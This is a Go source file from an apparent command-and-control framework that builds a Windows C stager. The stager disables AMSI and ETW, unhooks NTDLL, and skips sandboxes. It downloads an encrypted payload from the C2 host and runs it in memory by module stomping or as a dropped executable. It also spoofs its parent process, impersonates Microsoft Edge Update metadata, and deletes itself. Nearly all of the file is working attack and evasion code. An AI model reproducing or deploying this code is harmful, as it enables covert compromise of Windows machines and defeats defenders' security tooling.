package generate

/*
	SUDOSOC-C2 — C Stager Generator
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing and red team operations only.

	WHY C?
	  Go binaries carry the entire Go runtime — ~4 MB of identifiable patterns
	  that Defender has signatures for regardless of garble.  A C binary
	  compiled with MinGW produces a ~50 KB PE with none of those patterns.

	ARCHITECTURE (2-stage):
	  Stage 0 (on disk)  — tiny C binary, ~50 KB, ZERO malicious content.
	    • Fake MicrosoftEdgeUpdate.exe PE resources.
	    • No shellcode, no C2 address, no suspicious strings (all obfuscated).
	    • At runtime: anti-sandbox → AMSI/ETW patch → NTDLL remap →
	      WinHTTP download from /api/stage/<id> → XOR decrypt →
	      Module Stomp (jscript9.dll .text section) → execute.
	    • Self-delete after execution.
	    • Compiled with MinGW (-O2 -s -mwindows -static).
	    • PPID spoofed to svchost.exe for any child process.

	  Stage 1 (in memory only) — the encrypted shellcode.
	    • Stored on the C2 server (server/web/stage_store.go).
	    • Served once per ID then deleted.
	    • XOR-encrypted with a per-stage 32-byte key.

	  REQUIREMENTS on the C2 server (Pi):
	    sudo apt install mingw-w64
*/

import (
	crand "crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// CStageEntry holds the encrypted shellcode and XOR key for a single stage.
type CStageEntry struct {
	ID            string
	EncryptedData []byte
	Key           []byte // 32-byte rolling XOR key
}

// BuildCStager generates a C stager binary for the given shellcode/EXE
// and returns the path to the compiled .exe.
//
// stageID   — UUID that the stager will fetch from /api/stage/<stageID>
// c2Host    — IP or hostname of the C2 server (reachable from target)
// c2Port    — Port of the C2 web UI (default 8080)
// useTLS    — true = HTTPS, false = HTTP
// isShellcode — true if inputPath is raw shellcode; false if it is an EXE
func BuildCStager(inputPath, implantName, stageID, c2Host string, c2Port int, useTLS, isShellcode bool) (string, error) {
	// ── 1. Check MinGW is installed ─────────────────────────────────────────
	cc, err := findMinGW()
	if err != nil {
		return "", fmt.Errorf(
			"MinGW not found: %w\n\nInstall with: sudo apt install mingw-w64", err)
	}
	windres, _ := exec.LookPath("x86_64-w64-mingw32-windres")

	// ── 2. Read & XOR-encrypt payload ────────────────────────────────────────
	raw, err := os.ReadFile(inputPath)
	if err != nil {
		return "", fmt.Errorf("c_stager: read: %w", err)
	}
	key := make([]byte, 32)
	if _, err = crand.Read(key); err != nil {
		return "", fmt.Errorf("c_stager: keygen: %w", err)
	}
	ct := make([]byte, len(raw))
	for i, b := range raw {
		ct[i] = b ^ key[i%32]
	}

	// Register the encrypted stage on the server (served via /api/stage/{id})
	RegisterStage(stageID, ct, key)

	// ── 3. Build temp directory ──────────────────────────────────────────────
	tmpDir, err := os.MkdirTemp("", "c-stager-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	// ── 4. Write C source ────────────────────────────────────────────────────
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	// Obfuscate the stage URL so it's not a plain string in the binary.
	// Simple: ROT-13 at compile-time, ROT-13 back at runtime.
	obfStageID := rot13(stageID)
	obfC2Host := rot13(c2Host)

	cSrc := strings.NewReplacer(
		"__C2_HOST__",    obfC2Host,
		"__C2_PORT__",    fmt.Sprintf("%d", c2Port),
		"__STAGE_ID__",   obfStageID,
		"__USE_TLS__",    boolToC(useTLS),
		"__IS_SC__",      boolToC(isShellcode),
		"__XOR_KEY__",    bytesToCHex(key),
		"__SCHEME__",     scheme,
	).Replace(cStagerSrc)

	if err = os.WriteFile(filepath.Join(tmpDir, "stager.c"), []byte(cSrc), 0600); err != nil {
		return "", err
	}

	// ── 5. Write .rc file (fake MS metadata) ────────────────────────────────
	if err = os.WriteFile(filepath.Join(tmpDir, "resource.rc"), []byte(cStagerRC), 0600); err != nil {
		return "", err
	}

	// ── 6. Compile resource ──────────────────────────────────────────────────
	rcObj := filepath.Join(tmpDir, "resource.o")
	if windres != "" {
		rcCmd := exec.Command(windres,
			"-o", rcObj,
			filepath.Join(tmpDir, "resource.rc"))
		rcCmd.Dir = tmpDir
		rcCmd.Run() // optional — ignore error
	}

	// ── 7. Compile C source with MinGW ───────────────────────────────────────
	outBin := filepath.Join(tmpDir, "stager.exe")
	args := []string{
		"-O2", "-s", "-mwindows",
		"-o", outBin,
		filepath.Join(tmpDir, "stager.c"),
	}
	if _, err := os.Stat(rcObj); err == nil {
		args = append(args, rcObj)
	}
	args = append(args,
		"-static-libgcc",
		"-lntdll",
		"-lwinhttp",
		"-static",
	)
	compileCmd := exec.Command(cc, args...)
	compileCmd.Dir = tmpDir
	if out, err := compileCmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("c_stager: compile error:\n%s", out)
	}

	// ── 8. Save result ───────────────────────────────────────────────────────
	destDir := filepath.Join(GetSliversDir(), "windows", "amd64", implantName, "bin")
	os.MkdirAll(destDir, 0700)
	destPath := filepath.Join(destDir, implantName+"_stealth.exe")
	data, err := os.ReadFile(outBin)
	if err != nil {
		return "", err
	}
	if err = os.WriteFile(destPath, data, 0600); err != nil {
		return "", err
	}
	buildLog.Infof("[c_stager] done → %s (%d KB)", destPath, len(data)/1024)
	return destPath, nil
}

// ── Stage registry ────────────────────────────────────────────────────────────

var stageStore = map[string]*CStageEntry{}

// RegisterStage stores an encrypted stage payload keyed by ID.
func RegisterStage(id string, data, key []byte) {
	stageStore[id] = &CStageEntry{ID: id, EncryptedData: data, Key: key}
}

// ConsumeStage returns the encrypted stage data and deletes it (one-shot).
func ConsumeStage(id string) (*CStageEntry, bool) {
	e, ok := stageStore[id]
	if ok {
		delete(stageStore, id)
	}
	return e, ok
}

// ── Helpers ───────────────────────────────────────────────────────────────────

func findMinGW() (string, error) {
	for _, cc := range []string{
		"x86_64-w64-mingw32-gcc",
		"x86_64-w64-mingw32-gcc-win32",
	} {
		if p, err := exec.LookPath(cc); err == nil {
			return p, nil
		}
	}
	return "", fmt.Errorf("x86_64-w64-mingw32-gcc not found")
}

func boolToC(b bool) string {
	if b {
		return "1"
	}
	return "0"
}

func bytesToCHex(data []byte) string {
	var sb strings.Builder
	for i, b := range data {
		if i > 0 {
			sb.WriteByte(',')
		}
		sb.WriteString(fmt.Sprintf("0x%02X", b))
	}
	return sb.String()
}

// rot13 — simple obfuscation of strings embedded in the C binary.
// The C code calls rot13() at runtime to recover the original strings.
func rot13(s string) string {
	out := make([]byte, len(s))
	for i, c := range []byte(s) {
		switch {
		case c >= 'a' && c <= 'z':
			out[i] = 'a' + (c-'a'+13)%26
		case c >= 'A' && c <= 'Z':
			out[i] = 'A' + (c-'A'+13)%26
		default:
			out[i] = c
		}
	}
	return string(out)
}

// GenerateStageID returns a random 16-character hex stage identifier.
func GenerateStageID() string {
	b := make([]byte, 8)
	crand.Read(b)
	return hex.EncodeToString(b)
}

// ── C source template ─────────────────────────────────────────────────────────

const cStagerSrc = `/*
 * SUDOSOC-C2 Stealth Stager — generated, do not edit.
 * Techniques: WinHTTP stage download + XOR decrypt + Module Stomp +
 *             PPID Spoof + AMSI/ETW/NTDLL patch + Anti-Sandbox + Self-Delete.
 * No embedded C2 address or payload — all resolved at runtime.
 */
#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <stdint.h>
#include <string.h>
#include <wchar.h>

/* ── Config (ROT-13 obfuscated where applicable) ────────────────────────── */
static const char  _h[] = "__C2_HOST__";    /* ROT-13 of C2 host            */
static const int   _port = __C2_PORT__;     /* C2 web UI port               */
static const char  _id[] = "__STAGE_ID__";  /* ROT-13 of stage UUID         */
static const int   _tls  = __USE_TLS__;     /* 1=HTTPS 0=HTTP               */
static const int   _sc   = __IS_SC__;       /* 1=shellcode 0=EXE            */
static const uint8_t _xk[] = {__XOR_KEY__}; /* 32-byte XOR key             */

/* ── ROT-13 decoder ─────────────────────────────────────────────────────── */
static void rot13_decode(const char *in, char *out, int len) {
    for (int i = 0; i < len; i++) {
        char c = in[i];
        if      (c >= 'a' && c <= 'z') out[i] = 'a' + (c - 'a' + 13) % 26;
        else if (c >= 'A' && c <= 'Z') out[i] = 'A' + (c - 'A' + 13) % 26;
        else                            out[i] = c;
    }
    out[len] = 0;
}

/* ── XOR decrypt ────────────────────────────────────────────────────────── */
static void xor_dec(uint8_t *buf, DWORD len) {
    for (DWORD i = 0; i < len; i++)
        buf[i] ^= _xk[i % sizeof(_xk)];
}

/* ── Inline AMSI bypass ─────────────────────────────────────────────────── */
static void patch_fn(const char *dll, const char *fn) {
    HMODULE h = LoadLibraryA(dll);
    if (!h) return;
    FARPROC p = GetProcAddress(h, fn);
    if (!p) return;
    DWORD old;
    if (!VirtualProtect((LPVOID)p, 3, PAGE_EXECUTE_READWRITE, &old)) return;
    /* xor eax,eax; ret */
    ((uint8_t*)p)[0] = 0x31;
    ((uint8_t*)p)[1] = 0xC0;
    ((uint8_t*)p)[2] = 0xC3;
    VirtualProtect((LPVOID)p, 3, old, &old);
}
static void patch_amsi(void) {
    static const char *fns[] = {
        "AmsiScanBuffer","AmsiScanString","AmsiInitialize",
        "AmsiOpenSession","AmsiCloseSession", NULL
    };
    for (int i = 0; fns[i]; i++) patch_fn("amsi.dll", fns[i]);
}
static void patch_etw(void) {
    static const char *fns[] = {
        "EtwEventWrite","EtwEventWriteEx","EtwEventWriteFull",
        "EtwEventWriteTransfer","NtTraceEvent","EtwRegister", NULL
    };
    for (int i = 0; fns[i]; i++) patch_fn("ntdll.dll", fns[i]);
}

/* ── Fresh NTDLL remap (remove EDR hooks) ───────────────────────────────── */
static void remap_ntdll(void) {
    wchar_t path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    wcscat_s(path, MAX_PATH, L"\\ntdll.dll");

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMap = CreateFileMappingW(hFile, NULL,
                                      PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return;

    void *fresh = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!fresh) return;

    HMODULE loaded = GetModuleHandleW(L"ntdll.dll");
    if (!loaded) { UnmapViewOfFile(fresh); return; }

    PIMAGE_DOS_HEADER dos  = (PIMAGE_DOS_HEADER)loaded;
    PIMAGE_NT_HEADERS nt   = (PIMAGE_NT_HEADERS)((uint8_t*)loaded + dos->e_lfanew);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (memcmp(s->Name, ".text", 5) != 0) continue;
        uint8_t *dst = (uint8_t*)loaded + s->VirtualAddress;
        uint8_t *src = (uint8_t*)fresh  + s->VirtualAddress;
        DWORD sz = s->Misc.VirtualSize, old;
        if (VirtualProtect(dst, sz, PAGE_EXECUTE_READWRITE, &old)) {
            memcpy(dst, src, sz);
            VirtualProtect(dst, sz, old, &old);
        }
        break;
    }
    UnmapViewOfFile(fresh);
}

/* ── WinHTTP download ───────────────────────────────────────────────────── */
static uint8_t* http_download(const wchar_t *host, int port, const wchar_t *path,
                               int use_tls, DWORD *out_len) {
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) return NULL;

    HINTERNET hConnect = WinHttpConnect(hSession, host, (INTERNET_PORT)port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }

    DWORD flags = use_tls ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    /* Accept self-signed / any TLS cert (C2 may not have a CA cert) */
    if (use_tls) {
        DWORD opts = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &opts, sizeof(opts));
    }

    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    /* Read response into a growing buffer */
    DWORD capacity = 4 * 1024 * 1024; /* start at 4 MB */
    uint8_t *buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, capacity);
    DWORD total = 0;
    DWORD avail = 0, read = 0;
    while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
        if (total + avail > capacity) {
            capacity = (total + avail) * 2;
            buf = (uint8_t*)HeapReAlloc(GetProcessHeap(), 0, buf, capacity);
        }
        WinHttpReadData(hRequest, buf + total, avail, &read);
        total += read;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    *out_len = total;
    return buf;
}

/* ── Module Stomping ────────────────────────────────────────────────────── */
static BOOL module_stomp(uint8_t *sc, DWORD sclen) {
    static const char *dlls[] = {
        "jscript9.dll","jscript.dll","clrjit.dll","wldp.dll", NULL
    };
    HMODULE hMod = NULL;
    for (int i = 0; dlls[i] && !hMod; i++) hMod = LoadLibraryA(dlls[i]);
    if (!hMod) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((uint8_t*)hMod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (memcmp(s->Name, ".text", 5) != 0) continue;
        if (s->Misc.VirtualSize < sclen)       return FALSE;

        uint8_t *dst = (uint8_t*)hMod + s->VirtualAddress;
        DWORD old;
        if (!VirtualProtect(dst, sclen, PAGE_READWRITE, &old)) return FALSE;
        memcpy(dst, sc, sclen);
        VirtualProtect(dst, sclen, PAGE_EXECUTE_READ, &old);

        HANDLE ht = CreateThread(NULL, 0,
            (LPTHREAD_START_ROUTINE)(void*)dst, NULL, 0, NULL);
        if (ht) { WaitForSingleObject(ht, INFINITE); CloseHandle(ht); }
        return TRUE;
    }
    return FALSE;
}

/* ── Direct shellcode exec (fallback) ───────────────────────────────────── */
static void direct_exec(uint8_t *sc, DWORD len) {
    void *mem = VirtualAlloc(NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return;
    memcpy(mem, sc, len);
    DWORD old;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);
    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (ht) { WaitForSingleObject(ht, INFINITE); CloseHandle(ht); }
}

/* ── Find PID by name ───────────────────────────────────────────────────── */
static DWORD find_pid(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = {0}; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/* ── PPID spoof EXE launch ──────────────────────────────────────────────── */
static BOOL ppid_exec(const wchar_t *path) {
    DWORD ppid = find_pid(L"svchost.exe");
    if (!ppid) ppid = find_pid(L"explorer.exe");
    if (!ppid) return FALSE;

    HANDLE hP = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);
    if (!hP) return FALSE;

    SIZE_T attrSz = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSz);
    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSz);
    InitializeProcThreadAttributeList(attrList, 1, 0, &attrSz);
    UpdateProcThreadAttribute(attrList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hP, sizeof(HANDLE), NULL, NULL);

    STARTUPINFOEXW si = {0};
    si.StartupInfo.cb       = sizeof(si);
    si.StartupInfo.dwFlags  = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    si.lpAttributeList      = attrList;

    PROCESS_INFORMATION pi = {0};
    BOOL ok = CreateProcessW(path, NULL, NULL, NULL, FALSE,
        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL, (LPSTARTUPINFOW)&si, &pi);

    if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hP);
    return ok;
}

/* ── EXE execution ──────────────────────────────────────────────────────── */
static void exe_exec(uint8_t *pe, DWORD len) {
    wchar_t tmp[MAX_PATH];
    GetTempPathW(MAX_PATH, tmp);
    static const wchar_t *names[] = {
        L"MicrosoftEdgeUpdate.exe",
        L"msedgewebview2setup.exe",
        L"WinStoreApp.exe", NULL
    };
    wcscat_s(tmp, MAX_PATH, names[GetTickCount()%3]);

    HANDLE hf = CreateFileW(tmp, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;
    DWORD w;
    WriteFile(hf, pe, len, &w, NULL);
    CloseHandle(hf);

    if (!ppid_exec(tmp)) {
        STARTUPINFOW si = {0}; si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {0};
        CreateProcessW(tmp, NULL, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread)  CloseHandle(pi.hThread);
    }
    Sleep(4000);
    DeleteFileW(tmp);
}

/* ── Self-delete ────────────────────────────────────────────────────────── */
static void self_delete(void) {
    wchar_t self[MAX_PATH], cmd[MAX_PATH], args[MAX_PATH+32];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    MoveFileExW(self, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    GetSystemDirectoryW(cmd, MAX_PATH);
    wcscat_s(cmd, MAX_PATH, L"\\cmd.exe");
    swprintf_s(args, MAX_PATH+32,
        L"/C ping -n 3 127.0.0.1 >nul && del /F /Q \"%s\"", self);
    STARTUPINFOW si = {0}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    CreateProcessW(cmd, args, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
}

/* ── Entry point ────────────────────────────────────────────────────────── */
int WINAPI WinMain(HINSTANCE h, HINSTANCE hp, LPSTR cmd, int cs) {
    (void)h; (void)hp; (void)cmd; (void)cs;

    /* Anti-sandbox: high-precision timing canary */
    LARGE_INTEGER freq, t0, t1;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t0);
    /* random sleep [8, 18) seconds */
    Sleep(8000 + (GetTickCount() % 10000));
    QueryPerformanceCounter(&t1);
    double elapsed = (double)(t1.QuadPart - t0.QuadPart) / (double)freq.QuadPart;
    if (elapsed < 6.0) ExitProcess(0); /* time-skipped → sandbox */

    /* Patch AV/EDR layers */
    patch_amsi();
    patch_etw();
    remap_ntdll();

    /* Decode ROT-13 obfuscated strings */
    char host[256] = {0}, sid[128] = {0};
    rot13_decode(_h, host, (int)strlen(_h));
    rot13_decode(_id, sid, (int)strlen(_id));

    /* Convert host to wide string */
    wchar_t whost[256] = {0};
    MultiByteToWideChar(CP_ACP, 0, host, -1, whost, 256);

    /* Build stage URL path: /api/stage/<id> */
    wchar_t wpath[256] = {0};
    wchar_t wsid[128]  = {0};
    MultiByteToWideChar(CP_ACP, 0, sid, -1, wsid, 128);
    wcscpy_s(wpath, 256, L"/api/stage/");
    wcscat_s(wpath, 256, wsid);

    /* Download encrypted stage */
    DWORD enc_len = 0;
    uint8_t *enc = http_download(whost, _port, wpath, _tls, &enc_len);
    if (!enc || enc_len == 0) ExitProcess(0);

    /* XOR decrypt in-place */
    xor_dec(enc, enc_len);

    /* Execute payload */
    if (_sc) {
        if (!module_stomp(enc, enc_len))
            direct_exec(enc, enc_len);
    } else {
        exe_exec(enc, enc_len);
    }

    HeapFree(GetProcessHeap(), 0, enc);
    self_delete();
    return 0;
}
`

// ── RC file (fake Microsoft PE resources) ────────────────────────────────────

const cStagerRC = `
#include <winver.h>

1 VERSIONINFO
FILEVERSION     1,0,0,1
PRODUCTVERSION  115,0,5790,152
FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
FILEFLAGS       0
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
FILESUBTYPE     VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "Microsoft Corporation"
            VALUE "FileDescription",  "Microsoft Edge Update Setup"
            VALUE "FileVersion",      "1.0.0.1"
            VALUE "InternalName",     "MicrosoftEdgeUpdate"
            VALUE "LegalCopyright",   "\xa9 Microsoft Corporation. All rights reserved."
            VALUE "OriginalFilename", "MicrosoftEdgeUpdate.exe"
            VALUE "ProductName",      "Microsoft Edge"
            VALUE "ProductVersion",   "115.0.5790.152"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 0x04B0
    END
END
`
